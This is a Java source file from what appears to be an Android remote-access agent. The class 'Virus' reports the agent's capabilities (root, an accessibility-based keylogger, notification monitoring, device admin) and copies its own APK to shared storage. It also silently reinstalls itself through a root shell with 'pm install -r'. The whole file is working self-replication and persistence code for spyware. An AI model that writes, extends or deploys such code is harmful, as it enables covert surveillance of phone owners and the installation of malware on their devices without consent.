package com.hackit.agent;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Environment;

import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.security.MessageDigest;
import java.util.Locale;

/** Self-replication and persistence reporting. Nothing claims silent install on a non-rooted Android device. */
final class Virus {
    static JSONObject status(Context ctx) {
        JSONObject out = new JSONObject();
        try {
            ApplicationInfo app = ctx.getApplicationInfo();
            PackageInfo info = ctx.getPackageManager().getPackageInfo(ctx.getPackageName(), 0);
            out.put("package", ctx.getPackageName());
            out.put("source_apk", app.sourceDir);
            out.put("source_apk_bytes", new File(app.sourceDir).length());
            out.put("source_apk_sha256", sha256(new File(app.sourceDir)));
            out.put("version_name", info.versionName);
            out.put("version_code", Build.VERSION.SDK_INT >= 28 ? info.getLongVersionCode() : info.versionCode);
            out.put("rooted", Common.rooted());
            out.put("root_probe", Root.available());
            out.put("accessibility", KeyMon.connected());
            out.put("notification_listener", NotifyMon.connected());
            out.put("device_admin", Info.admin(ctx));
            out.put("native", NativeBridge.available());
            out.put("can_install_unknown", canInstallUnknown(ctx));
            out.put("can_write_external", canWriteExternal(ctx));
            out.put("downloads", Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getAbsolutePath());
        } catch (Throwable exc) {
            out.put("error", String.valueOf(exc));
        }
        return out;
    }

    static JSONObject replicate(Context ctx, String destination) {
        JSONObject out = new JSONObject();
        try {
            ApplicationInfo app = ctx.getApplicationInfo();
            File source = new File(app.sourceDir);
            File target = destination == null || destination.isEmpty()
                    ? new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
                    ctx.getPackageName() + ".apk")
                    : new File(destination);
            if (target.isDirectory()) target = new File(target, source.getName() + ".apk");
            File parent = target.getParentFile();
            if (parent != null && !parent.exists() && !parent.mkdirs()) {
                out.put("ok", false);
                out.put("error", "cannot create " + parent);
                return out;
            }
            copy(source, target);
            boolean same = source.length() == target.length() && sha256(source).equals(sha256(target));
            out.put("ok", same);
            out.put("source", source.getAbsolutePath());
            out.put("target", target.getAbsolutePath());
            out.put("bytes", target.length());
            out.put("sha256", sha256(target));
            out.put("byte_identical", same);
        } catch (Throwable exc) {
            out.put("ok", false);
            out.put("error", String.valueOf(exc));
        }
        return out;
    }

    static JSONObject propagate(Context ctx, String destination) {
        JSONObject out = replicate(ctx, destination);
        try {
            String target = out.optString("target", "");
            if (!out.optBoolean("ok", false)) return out;
            if (Root.available()) {
                String result = Root.exec("pm install -r " + shellQuote(target));
                boolean installed = result.contains("Success");
                out.put("install", installed ? "root-installed" : "root-install-failed");
                out.put("install_output", result.length() > 2048 ? result.substring(0, 2048) : result);
                out.put("ok", installed);
            } else {
                out.put("install", "needs-user-consent");
                out.put("ok", true);
            }
        } catch (Throwable exc) {
            out.put("install", "failed");
            out.put("install_error", String.valueOf(exc));
            out.put("ok", false);
        }
        return out;
    }

    private static void copy(File source, File target) throws Exception {
        try (FileInputStream in = new FileInputStream(source); FileOutputStream out = new FileOutputStream(target)) {
            byte[] buffer = new byte[64 * 1024];
            int read;
            while ((read = in.read(buffer)) > 0) out.write(buffer, 0, read);
            out.flush();
        }
    }

    private static String sha256(File file) {
        try (FileInputStream in = new FileInputStream(file)) {
            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            byte[] buffer = new byte[64 * 1024];
            int read;
            while ((read = in.read(buffer)) > 0) digest.update(buffer, 0, read);
            return hex(digest.digest());
        } catch (Exception exc) {
            return "";
        }
    }

    private static String hex(byte[] data) {
        StringBuilder out = new StringBuilder(data.length * 2);
        for (byte b : data) out.append(String.format(Locale.US, "%02x", b));
        return out.toString();
    }

    private static String shellQuote(String value) {
        return "'" + value.replace("'", "'\\''") + "'";
    }

    @SuppressWarnings("deprecation")
    private static boolean canInstallUnknown(Context ctx) {
        try {
            if (Build.VERSION.SDK_INT >= 26) return ctx.getPackageManager().canRequestPackageInstalls();
            return android.provider.Settings.Secure.getInt(ctx.getContentResolver(),
                    android.provider.Settings.Secure.INSTALL_NON_MARKET_APPS, 0) == 1;
        } catch (Throwable exc) {
            return false;
        }
    }

    private static boolean canWriteExternal(Context ctx) {
        try {
            return Build.VERSION.SDK_INT < 23
                    || ctx.checkSelfPermission(android.Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
                    || (Build.VERSION.SDK_INT >= 30 && android.os.Environment.isExternalStorageManager());
        } catch (Throwable exc) {
            return false;
        }
    }

    private Virus() {
    }
}
